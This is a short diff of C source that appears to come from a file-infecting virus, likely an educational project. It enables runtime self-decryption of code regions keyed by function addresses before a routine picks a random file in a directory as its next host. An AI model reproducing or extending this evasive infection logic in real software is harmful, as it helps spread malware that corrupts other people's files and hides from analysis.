@@ -90,6 +90,8 @@ __attribute__((always_inline)) static inline void update_path(char *path, const 
 
 void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context)
 {
+	decrypt_left(keychain, (char *)war, (void *)find_host - (void *)war);
+
 	struct s_directory *directory = (struct s_directory *)dir;
 	char *filename;
 
@@ -109,8 +111,8 @@ void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, cons
 	}
 
 label:
-//	update_keychain_right(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
-//	decrypt_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
+	update_keychain_left(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
+	decrypt_left(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
 
 	host_constructor(host, keychain, directory[_get_random_integer(size)].path, context);
 }
